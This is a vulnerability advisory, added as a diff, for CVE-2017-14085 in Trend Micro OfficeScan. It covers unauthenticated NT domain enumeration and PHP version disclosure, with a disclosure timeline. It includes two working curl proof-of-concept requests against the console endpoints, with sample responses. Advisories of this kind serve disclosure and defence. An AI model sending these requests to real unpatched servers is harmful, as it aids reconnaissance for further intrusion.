@@ -1,0 +1,162 @@
+[+] Credits: John Page (aka hyp3rlinx)
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/CVE-2017-14085-TRENDMICRO-OFFICESCAN-XG-REMOTE-NT-DOMAIN-PHP-INFO-DISCLOSURE.txt
+[+] ISR: ApparitionSec            
+ 
+
+
+Vendor:
+==================
+www.trendmicro.com
+
+
+
+Product:
+===========
+OfficeScan
+v11.0 and XG (12.0)*
+
+
+Vulnerability Type:
+===================
+Unauthorized NT Domain Disclosure
+Unauthorized PHP Information Disclosure
+
+OfficeScan protects enterprise networks from malware, network viruses, web-based threats, spyware, and mixed threat attacks.
+An integrated solution, OfficeScan consists of the OfficeScan agent program that resides at the endpoint and a server program that
+manages all agents. The OfficeScan agent guards the endpoint and reports its security status to the server. The server, through the
+web-based management console, makes it easy to set coordinated security policies and deploy updates to every agent.
+
+
+
+CVE Reference:
+==============
+CVE-2017-14085
+
+
+
+Security Issue(s):
+================
+( NT Domain Disclosure )
+Remote unauthenticated attackers who reach the TrendMicro OfficeScan XG application can query the networks NT domains.
+NT enumeration is leaked by the web interface when it should not do so. Usually, you use NET commands so while this NT enumeration
+is not high in severity, it should not return this information and especially to unauthorized users as it can aid in launching
+further attacks.
+
+
+( PHP Information Disclosure )
+Remote unauthenticated attackers that can connect to TrendMicro OfficeScan XG application can query the PHP version and modules.
+
+In 'analyzeWF.php" we see get_loaded_extensions() and phpversion() calls, but session or authentication check is made.
+
+$strAnalyzeResultHeader .= analyzeWFShowItemInfo('Current PHP version: '.phpversion());
+$strAnalyzeResultHeader .= analyzeWFShowItemInfo('PHP extensions: '.implode(', ',get_loaded_extensions()));
+$strAnalyzeResultHeader .= analyzeWFShowItemInfo('WGF version : '.$strVersion);
+
+etc...
+
+
+References:
+===========
+https://success.trendmicro.com/solution/1118372
+
+
+
+Exploit/POC (NT Domain Disclosure):
+=====================================
+[root@localhost /]# curl -v -k  https://VICTIM-IP:4343/officescan/console/RemoteInstallCGI/cgiGetNTDomain.exe
+* About to connect() to VICTIM-IP port 4343
+*   Trying VICTIM-IP... connected
+
+
+< HTTP/1.1 200 OK
+< Pragma: no-cache
+< Content-Type: text/plain;charset=utf-8
+< Server: Microsoft-IIS/7.5
+< X-Powered-By: ASP.NET
+< Date: Thu, 01 Jun 2017 15:27:27 GMT
+< Connection: close
+< Content-Length: 510
+{
+   "ERROR" : {
+      "ERROR_CODE" : 0
+   },
+   "RESPONSE" : {
+      "NODES" : [
+         {
+            "NAME" : "Avaya"
+         },
+         {
+            "NAME" : "Km-netprinters"
+         },
+         {
+            "NAME" : "Mshome"
+         },
+         {
+            "NAME" : "Printserver"
+         },
+         {
+            "NAME" : "MyDomain"
+         },
+         {
+            "NAME" : "Workgroup"
+         },
+         {
+            "NAME" : "Xpemb"
+         }
+      ]
+   }
+}
+
+
+Exploit / POC (PHP Information Disclosure):
+============================================
+c:\> curl -k https://VICTIM-IP:4343/officescan/console/html/widget/repository/widgetPool/wp1/interface/analyzeWF.php
+
+HTTP/1.1 200 OK
+
+[INI_UPDATE_SECTION]
+
+>>>> Start Anaylze WGF : 2017-06-02 15:58:26
+[INFO] Current PHP version: 7.0.6
+[INFO] PHP extensions: Core, bcmath, calendar, ctype, date, filter, hash, iconv, json, mcrypt, SPL, pcre, Reflection, session, standard, mysqlnd, tokenizer, zip, zlib, libxml, dom, PDO, openssl, SimpleXML, xml, wddx, xmlreader, xmlwriter, cgi-fcgi, curl, gmp, ldap, mbstring, Phar, pdo_sqlite, soap, com_dotnet
+[INFO] WGF version : 3.8
+[INFO] WGF current wp in /path/to/widgetPool/config.php : wp2
+[INFO] WGF is /path/to/widgets_new exists : true
+[ERROR] C:\Windows\TEMP check read/write permissions : failed
+To solved this problem please reference document here.
+
+etc...
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+
+Severity:
+=========
+Medium
+
+
+
+Disclosure Timeline:
+=====================
+Vendor Notification:  June 2, 2017
+Vendor releases fixes / advisory : September 27, 2017
+September 28, 2017  : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
